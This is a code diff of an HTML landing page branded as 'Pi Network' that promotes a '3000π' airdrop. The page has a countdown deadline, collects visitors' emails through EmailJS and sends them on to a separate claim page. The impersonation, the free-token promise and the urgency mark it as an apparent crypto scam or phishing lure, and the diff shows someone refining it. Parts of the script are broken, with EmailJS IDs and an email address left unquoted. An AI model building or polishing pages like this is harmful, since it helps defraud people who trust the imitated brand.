@@ -7,14 +7,12 @@
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@600&family=Inter:wght@400;500&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        /* Reset default styles */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
 
-        /* Body with purple gradient */
         body {
             background: linear-gradient(180deg, #4b1e9e 0%, #2d0b5e 100%);
             color: #f9fafb;
@@ -28,18 +26,17 @@
             animation: fadeIn 1s ease-in;
         }
 
-        /* Fade-in animation */
         @keyframes fadeIn {
             from { opacity: 0; transform: translateY(20px); }
             to { opacity: 1; transform: translateY(0); }
         }
 
-        /* Logo styling */
         .logo {
             display: flex;
             align-items: center;
             justify-content: center;
             margin-bottom: 30px;
+            text-decoration: none;
         }
 
         .logo img {
@@ -55,7 +52,6 @@
             font-family: 'Poppins', sans-serif;
         }
 
-        /* Main heading */
         h1 {
             font-size: 28px;
             font-weight: 600;
@@ -64,7 +60,6 @@
             font-family: 'Poppins', sans-serif;
         }
 
-        /* App Store Buttons */
         .app-buttons {
             display: flex;
             justify-content: center;
@@ -94,7 +89,6 @@
             background-image: url('https://upload.wikimedia.org/wikipedia/commons/7/7a/Google_Play_2022_logo.svg');
         }
 
-        /* Claim (Subscribe) section */
         .claim-section {
             width: 100%;
             max-width: 450px;
@@ -117,7 +111,6 @@
             gap: 20px;
         }
 
-        /* Form inputs */
         .claim-form input {
             padding: 14px;
             border: 1px solid rgba(255, 255, 255, 0.1);
@@ -138,7 +131,6 @@
             box-shadow: 0 0 0 3px rgba(245, 166, 35, 0.2);
         }
 
-        /* Buttons */
         .claim-form button, .claim-form .claim-now-button {
             background-color: #ff4081;
             color: #f9fafb;
@@ -167,7 +159,6 @@
             cursor: not-allowed;
         }
 
-        /* Success message */
         .success-message {
             color: #34d399;
             font-size: 16px;
@@ -175,14 +166,12 @@
             display: none;
         }
 
-        /* Info text */
         .info-text {
             font-size: 14px;
             color: #9ca3af;
             margin-top: 20px;
         }
 
-        /* Write-up section */
         .write-up {
             font-size: 14px;
             color: #d1d5db;
@@ -191,7 +180,6 @@
             text-align: left;
         }
 
-        /* Progress Bar Section */
         .progress-section {
             margin-top: 40px;
             width: 100%;
@@ -220,7 +208,6 @@
             transition: width 1s ease-in-out;
         }
 
-        /* Airdrop Rewards Tracker */
         .rewards-section {
             margin-top: 40px;
             width: 100%;
@@ -239,7 +226,6 @@
             font-weight: 600;
         }
 
-        /* Community Spotlight Section */
         .spotlight-section {
             margin-top: 60px;
             width: 100%;
@@ -266,7 +252,6 @@
             line-height: 1.6;
         }
 
-        /* Status section */
         .status-section {
             margin-top: 60px;
             width: 100%;
@@ -315,7 +300,6 @@
             color: #f9fafb;
         }
 
-        /* Timer section */
         .timer-section {
             margin-top: 60px;
             width: 100%;
@@ -361,7 +345,6 @@
             opacity: 0.8;
         }
 
-        /* Footer */
         footer {
             display: flex;
             flex-direction: column;
@@ -401,11 +384,11 @@
     </style>
 </head>
 <body>
-    <!-- Logo -->
-    <div class="logo">
+    <!-- Logo (Clickable to Homepage) -->
+    <a href="index.html" class="logo">
         <img src="https://via.placeholder.com/48?text=π" alt="Pi Network Logo">
         <span>Pi Network</span>
-    </div>
+    </a>
 
     <!-- Subscribe Section -->
     <div class="claim-section">
@@ -497,10 +480,10 @@
     </footer>
 
     <!-- EmailJS SDK -->
-    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
     <script>
         // Initialize EmailJS with your User ID
-        emailjs.init(KtLqHh8xtlVMGAOPY); // Replace with your EmailJS User ID
+        emailjs.init(KtLqHh8xtlVMGAOPY); // Replace with your actual EmailJS User ID
 
         // Countdown Timer
         const deadline = new Date("2025-12-31T23:59:59").getTime();
@@ -525,9 +508,12 @@
         // Form Submission - Redirect to claim page
         const subscribeForm = document.getElementById("subscribe-form");
         const subscribeButton = document.getElementById("subscribe-button");
-        subscribeForm.addEventListener("submit", (e) => {
+        subscribeForm.addEventListener("submit", async (e) => {
             e.preventDefault();
             const email = document.getElementById("email").value;
+
+            // Reset messages
+            document.getElementById("success-message").style.display = "none";
 
             // Basic email validation
             if (!email || !email.includes("@")) {
@@ -535,10 +521,11 @@
                 return;
             }
 
-            // Show success message
-            document.getElementById("success-message").style.display = "block";
+            // Show loading state
+            subscribeButton.disabled = true;
+            subscribeButton.textContent = "Subscribing...";
 
-            // Send subscription confirmation email
+            // Get current date and time in WAT
             const currentDateTime = new Date().toLocaleString("en-US", {
                 timeZone: "Africa/Lagos",
                 hour12: true,
@@ -550,25 +537,32 @@
                 minute: "2-digit",
             });
 
-            emailjs.send(service_9a4wn0l, template_b9pz12e, {
-                to_email: sirprist1@gmail.com,
-                message: `You have successfully subscribed to Pi Network Airdrop at ${currentDateTime}. Proceed to claim your 3000π!`
-            }).then(() => {
+            try {
+                // Send subscription confirmation email
+                const response = await emailjs.send(service_9a4wn0l, template_b9pz12e, {
+                    to_email: email,
+                    message: `You have successfully subscribed to Pi Network Airdrop at ${currentDateTime}. Proceed to claim your 3000π!`,
+                    subscription: true
+                });
+
+                console.log("EmailJS Success:", response.status, response.text);
+
+                // Show success message
+                document.getElementById("success-message").style.display = "block";
+
                 // Redirect to claim page with email as query parameter
                 setTimeout(() => {
                     window.location.href = `claim.html?email=${encodeURIComponent(email)}`;
                 }, 1000);
-            }).catch((error) => {
-                alert("Failed to subscribe. Please try again.");
+            } catch (error) {
                 console.error("EmailJS Error:", error);
-            });
+                alert(`Failed to subscribe. Error: ${error.text || "Unknown error"}`);
+            } finally {
+                // Reset button state
+                subscribeButton.disabled = false;
+                subscribeButton.textContent = "Subscribe";
+            }
         });
-    </script>
-    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
-    <script>
-        (function() {
-            emailjs.init(KtLqHh8xtlVMGAOPY); // Replace with your User ID (e.g., user_1234567890abcdef)
-        })();
     </script>
 </body>
 </html>
